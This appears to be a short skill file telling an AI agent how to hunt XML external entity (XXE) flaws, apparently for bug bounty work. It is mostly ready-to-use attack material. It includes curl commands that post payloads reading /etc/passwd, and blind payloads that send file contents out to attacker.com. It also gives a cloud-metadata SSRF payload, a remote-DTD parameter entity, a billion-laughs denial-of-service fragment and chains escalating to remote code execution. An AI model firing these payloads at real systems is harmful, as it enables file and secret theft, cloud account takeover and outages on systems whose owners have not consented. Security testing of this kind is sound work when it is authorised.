---
name: hunt-xxe
description: XXE — file read, SSRF, blind XXE via OOB, billion laughs DoS, SOAP/REST XML. Must demonstrate file read or SSRF.
---

# XXE HUNTING — 3 BULLETS MAX

**Core:** XML parser processes external entities = file read / SSRF / DoS.

## DETECTION
```bash
# Basic XXE
curl -s -X POST "https://target.com/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
# If /etc/passwd in response → XXE CONFIRMED
# Blind XXE (OOB)
curl -s -X POST "https://target.com/api/xml" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal?data=file:///etc/passwd">]><data>&xxe;</data>'
```

## PAYLOADS
```
File read: <!ENTITY xxe SYSTEM "file:///etc/passwd">
SSRF: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
Blind: <!ENTITY xxe SYSTEM "http://attacker.com/?data=file:///etc/passwd">
Billion laughs: <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">
Parameter entity: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
SOAP: inject XXE in SOAP body
SVG: <svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>
```

## CHAINS
```
XXE → file read → secrets → infrastructure access → Critical
XXE → SSRF → cloud metadata → RCE → Critical
XXE → billion laughs DoS → High
```
